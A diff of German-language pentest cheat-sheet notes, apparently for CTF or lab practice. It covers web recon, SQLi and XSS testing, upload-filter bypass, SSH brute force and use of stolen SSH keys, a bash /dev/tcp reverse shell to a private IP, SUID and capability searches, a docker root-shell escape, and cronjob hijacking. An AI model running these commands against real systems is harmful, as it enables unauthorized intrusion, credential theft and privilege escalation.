@@ -1,3 +1,7 @@
+> [!info]
+> Hacktools: https://github.com/LasCC/HackTools/tree/master
+> Wappalyzer: https://www.wappalyzer.com/
+
 ## Initial Access
 
 1. IP range scannen (Ping scan)
@@ -32,6 +36,10 @@ gobuster dir -u 127.0.0.1 -w /usr/share/wordlists/dirbuster/directory-list-2.3-s
 - Mit Browserextension Wappalyzer checken welche Versionen -> Sind welche veraltet? (oft js und wordpress plugins) -> ExploitDB
 - Welches Framework wird verwendet? (php, html, js) -> Einfach mal testen ob es /login.php, /login.html oder so gibt (Grundsätzlich sieht man das über Wappalyzer)
 - Webseiten source code -> Gibts dev Kommentare? Hardcoded credentials? Veraltete Versionen?
+- Wenn es ein Wordpress Server ist, kann man wp-scan nutzen:
+```bash
+wp-scan --url http://127.0.0.1/ --plugins-detection aggressive
+```
 
 #### XSS, SQLi
 Wenn es Input Felder gibt, kann man testen ob cross-site-scripting oder SQL injections funktionieren:
@@ -46,7 +54,7 @@ SQLi (umgeht authentication):
 or true--
 ```
 
-=> Browserextension Hackertools hat sehr viele Beispiele zum testen (Achtung bei SQLi kann man auch die Datenbank zerschießen)
+=> Browserextension Hacktools hat sehr viele Beispiele zum testen (Achtung bei SQLi kann man auch die Datenbank zerschießen)
 
 Manchmal gibt es auch commands, die direkt auf dem Server ausgeführt werden z.B. um Inhalte von Dateien auszugeben (cat file.txt) -> Kann man andere commands ausführen? (Reverse shell, directory traversal, ssh)
 
@@ -88,7 +96,7 @@ or true--
 
 #### Uploads
 
-Manche Webseiten bieten Uploads für Bilder ö.äh an -> Ziel ist es eine Reverse Shell hochzuladen (Hackertools, Revshells)
+Manche Webseiten bieten Uploads für Bilder ö.äh an -> Ziel ist es eine Reverse Shell hochzuladen (Hacktools, Revshells)
 
 - Man kann Dateiendungsfilter oftmals umgehen z.B. statt revshell.php -> revshell.PhP oder revshell.php3
 - Manchmal wird einfach nur nach Endungen gesucht also geht sowas wie revshell.jpg.php
@@ -140,9 +148,21 @@ hydra -l user -P /usr/share/wordlists/rockyou.txt 127.0.0.1 ssh -t 4 -V
 ```
 
 
-3. Auch hier wieder SSH Version checken und schauen ob es vulnerabilities gibt (ExploitDB, Google)
+3. Auch hier wieder SSH Version checken und schauen ob es vulnerabilities gibt (ExploitDB, Google, GTFObins)
 
 4. Passwörter die wo anders verwendet wurden nochmal versuchen
+
+5. Kann man den private ssh-key von einem User extrahieren? (Über Exploit oder directory-traversal)
+```bash
+# SSH-Key in Datei schreiben
+echo "<Private ssh-key>" >> ssh-key
+
+# Berechtigungen von SSH-Key verändern, sonst wirft ssh error
+sudo chmod 600 ssh-key
+
+# SSH verwenden mit dem key
+ssh user@127.0.0.1 -i ssh-key
+```
 
 
 ## Persistance
@@ -150,7 +170,8 @@ hydra -l user -P /usr/share/wordlists/rockyou.txt 127.0.0.1 ssh -t 4 -V
 #### Reverse Shell
 
 Es gibt 2 Wege Reverse Shells zu erstellen:
-1. Commands (Hackertools/Revshells hat da einige anzubieten)
+
+1. Commands (Hacktools/Revshells hat da einige anzubieten)
 
 ```bash
 bash -c 'exec bash -i &>/dev/tcp/192.168.178.24/4000 <&1'
@@ -207,5 +228,83 @@ echo os.system("/bin/bash")
 1. Einfach bisschen untersuchen welche Dateien rumliegen -> Downloads, Documents etc.
 2. Dateiberechtigungen überprüfen
 
+Paar Ordner die man checken kann:
+```bash
+# Liegen interessante Dateien in den home Ordnern
+/home/user/Downloads
+/home/user/Documents
+/home/user/.bash_history
+/home/user/.zsh_history
 
+# Irgendwelche Auffälligkeiten/Abweichungen im root folder
+/
 
+# Ist irgendwas gemounted
+/mnt/
+```
+
+Was steht so in der history:
+```bash
+history
+```
+## Privilege Escalation
+### Commands
+
+Command um checken ob sudo falsch konfiguriert ist:
+```bash
+sudo -l
+```
+
+SUID sind Dateien die immer als der Owner ausgeführt werden -> Man sucht Dateien, die man ausführen kann aber die dann von root ausgeführt werden -> Reverseshell
+
+SUID commands:
+```bash
+find / -user root -perm /4000 2>/dev/null
+
+find / -perm -u=s -type f 2>/dev/null
+
+find / -type f -name '*.txt' 2>/dev/null
+
+find / -user root -perm -4000 -exec ls -ldb {}; > /tmp/suid
+
+getcap -r / 2>/dev/null
+```
+
+=> Findet man Dateien oder Versionen von Applikationen kann man die in https://gtfobins.github.io/ nachschauen z.B. wenn man Berechtigungen hat Docker zu starten:
+```bash
+# Erstellt eine Root Shell mit Docker
+docker run -v /:/mnt --rm -it alpine chroot /mnt sh
+```
+### Cronjobs
+Cronjobs sind jobs die z.B. Skripte ausführen
+
+Ziel ist dabei ein cronjob zu finden, der von root ausgeführt wird und wo man die Datei verändern kann -> Reverse shell
+
+Paar commands für cronjob stuff:
+```bash
+# Cronjobs für andere user
+crontab -l -u <username>
+
+# Cronjobs für sich selbst
+crontab -l
+
+# Cronjobs von root
+sudo crontab -l # Oft in Verbindung mit sudo -l
+cat /etc/crontab
+cat /etc/cron.d/*
+
+# Suche nach cronjobs, die auf beschreibare Dateien zeigen
+find /etc/cron* /var/spool/cron -type f -exec ls -l {} \;
+```
+
+(Mehr cronjob commands sind in Hacktools zu finden)
+
+Manchmal muss man auch nicht wissen ob es cronjobs gibt um es zu testen
+-> Findet man ein z.B. Skript, dass man bearbeiten kann sollte man da einfach mal testweise eine Reverseshell reinpflanzen und schauen ob die Datei vielleicht regelmäßig von einem cronjob ausgeführt wird
+
+### GTFO Bins
+https://gtfobins.github.io/
+
+Manchmal findet man Informationen zum System oder veraltete Versionen, die man dann einfach mal in GTFO bins nachschauen kann.
+
+Alternativ kann man mal commands ausprobieren, für "SUDO", "SUID", "Limited SUID"
